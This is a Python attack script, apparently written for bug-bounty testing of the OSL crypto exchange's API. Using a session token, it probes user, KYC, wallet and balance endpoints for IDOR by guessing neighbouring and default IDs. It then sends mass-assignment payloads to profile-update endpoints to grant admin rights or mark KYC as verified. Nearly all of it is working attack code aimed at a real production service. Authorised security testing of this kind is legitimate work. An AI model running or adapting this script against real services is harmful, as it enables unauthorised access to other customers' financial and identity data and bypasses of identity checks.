#!/usr/bin/env python3
"""
OSL Authenticated Deep Scan
=====================================
Run AFTER creating a test account on osl.com

HOW TO GET YOUR CREDENTIALS:
1. Go to https://www.osl.com/en/login/ and sign up/login with your @bugcrowdninja email
2. Log in, then:
   
   Open DevTools (F12) → Application → Cookies / Local Storage
   Copy the value of the session cookie / Authorization token (often a JWT)
   Paste it below as AUTH_TOKEN

3. Run: python authenticated_scan_osl.py
"""

import requests
import json
import time
import sys
import os
from pathlib import Path

os.environ["PYTHONIOENCODING"] = "utf-8"
try:
    sys.stdout.reconfigure(encoding="utf-8")
except:
    pass

# ============================================================
# CONFIGURE THESE AFTER CREATING YOUR ACCOUNT
# ============================================================
AUTH_TOKEN = os.environ.get("OSL_AUTH_TOKEN", "")  # JWT or Session Cookie

BASE = "https://api.osl.com"  # Assuming api.osl.com is the main API
RESULTS = []

# ============================================================

def sep(title):
    print(f"\n{'='*70}")
    print(f"  {title}")
    print(f"{'='*70}")

def log_finding(severity, vuln_type, url, detail, confidence="HIGH", verified=False):
    finding = {
        "severity": severity,
        "type": vuln_type,
        "url": url,
        "detail": detail,
        "confidence": confidence,
        "verified": verified,
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
    }
    RESULTS.append(finding)
    emoji = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡", "LOW": "🔵"}.get(severity, "⚪")
    v = "✅ VERIFIED" if verified else ""
    print(f"\n  {emoji} [{severity}] {vuln_type} {v}")
    print(f"     URL: {url}")
    print(f"     Detail: {detail}")
    return finding

def get_auth_headers(token=None):
    """Build auth headers. Often uses Bearer token."""
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json",
        "Content-Type": "application/json",
    }
    use_token = token or AUTH_TOKEN
    if use_token:
        if "Bearer" not in use_token and len(use_token) > 50:
            headers["Authorization"] = f"Bearer {use_token}"
        else:
            headers["Authorization"] = use_token
    return headers

def api_get(path, token=None):
    url = f"{BASE}{path}"
    try:
        r = requests.get(url, headers=get_auth_headers(token), timeout=10)
        return r
    except Exception as e:
        print(f"  ERROR: {e}")
        return None

def api_post(path, data=None, token=None):
    url = f"{BASE}{path}"
    try:
        r = requests.post(url, headers=get_auth_headers(token), json=data, timeout=10)
        return r
    except Exception as e:
        print(f"  ERROR: {e}")
        return None

def main():
    if not AUTH_TOKEN:
        print("=" * 70)
        print("  NO CREDENTIALS CONFIGURED!")
        print("=" * 70)
        print("""
  Set your OSL Authentication token:

  Windows (PowerShell):
    $env:OSL_AUTH_TOKEN = "eyJhbGciOiJIUzI1..."
    python authenticated_scan_osl.py

  HOW TO GET A TOKEN:
  1. Sign up/login at https://www.osl.com/en/login/ with @bugcrowdninja email
  2. Open DevTools (F12) -> Network
  3. Look at any API request to api.osl.com and copy the Authorization header or session cookie
        """)
        return

    sep("OSL AUTHENTICATED DEEP SCAN")

    # ── Phase 0: Verify auth & get identity ──
    sep("PHASE 0: VERIFY AUTH & IDENTITY")
    print("  Checking authentication against standard API endpoints...")
    
    # We try a few common endpoints for crypto exchanges
    endpoints = ["/api/v3/account", "/v1/user/profile", "/api/v1/me"]
    user_id = "unknown"
    
    for ep in endpoints:
        r = api_get(ep)
        if r and r.status_code == 200:
            print(f"  AUTH SUCCESS on {ep}")
            try:
                data = r.json()
                print(f"  Identity: {json.dumps(data)[:200]}")
                # Try to extract user ID
                if "id" in data: user_id = data["id"]
                elif "userId" in data: user_id = data["userId"]
                elif "data" in data and "id" in data["data"]: user_id = data["data"]["id"]
            except:
                pass
            break
        elif r:
            print(f"  {ep} -> {r.status_code}")

    # ── Phase 1: IDOR on Account / KYC endpoints ──
    sep("PHASE 1: IDOR & KYC ENDPOINTS")
    print("  Testing IDOR on common user/KYC endpoints...")
    
    test_ids = [1, 2, "admin", "00000000-0000-0000-0000-000000000000"]
    if user_id != "unknown" and isinstance(user_id, int):
        test_ids.append(user_id - 1)
        test_ids.append(user_id + 1)
        
    for tid in test_ids:
        for path in [f"/api/v1/user/{tid}", f"/api/v1/kyc/{tid}", f"/v1/account/{tid}"]:
            r = api_get(path)
            if r and r.status_code == 200:
                print(f"  [!] ACCESSIBLE: {path}")
                if "error" not in r.text.lower():
                    log_finding("HIGH", "IDOR_USER_DATA", path, f"Able to access data for ID: {tid}", verified=True)
            elif r:
                print(f"  {path} -> {r.status_code}")

    # ── Phase 2: Wallet / Balance IDOR ──
    sep("PHASE 2: WALLET & BALANCE IDOR")
    print("  Testing access to other users' wallets...")
    
    for path in ["/api/v1/wallets/1", "/api/v1/balances/1", "/api/v3/account/1"]:
        r = api_get(path)
        if r and r.status_code == 200:
            print(f"  [!] ACCESSIBLE: {path}")
            if "error" not in r.text.lower() and "balance" in r.text.lower():
                log_finding("CRITICAL", "IDOR_FINANCIAL_DATA", path, "Able to view balances of other accounts", verified=True)

    # ── Phase 3: Privilege Escalation (Mass Assignment) ──
    sep("PHASE 3: MASS ASSIGNMENT / PRIVILEGE ESCALATION")
    print("  Attempting to escalate privileges via profile update...")
    
    payloads = [
        {"role": "admin"},
        {"is_admin": True},
        {"permissions": ["superuser"]},
        {"kyc_status": "verified"} # Try to bypass KYC!
    ]
    
    for payload in payloads:
        # Try POST and PATCH on common update endpoints
        for path in ["/api/v1/user/profile", "/api/v1/user/update"]:
            url = f"{BASE}{path}"
            try:
                headers = get_auth_headers()
                r = requests.post(url, headers=headers, json=payload, timeout=5)
                if r.status_code == 200:
                    print(f"  Update success with {payload} -> {r.text[:100]}")
                    if "admin" in r.text.lower() or "verified" in r.text.lower() and "kyc" in payload:
                         log_finding("CRITICAL", "MASS_ASSIGNMENT", path, f"Accepted payload: {payload}", verified=True)
            except: pass

    # ── Save results ──
    sep("RESULTS SUMMARY")
    results_file = Path("data/autopilot/osl_authenticated_scan.json")
    results_file.parent.mkdir(parents=True, exist_ok=True)
    results_file.write_text(json.dumps(RESULTS, indent=2, default=str), encoding="utf-8")
    print(f"\n  Total findings: {len(RESULTS)}")
    print(f"  Results saved: {results_file}")

if __name__ == "__main__":
    main()
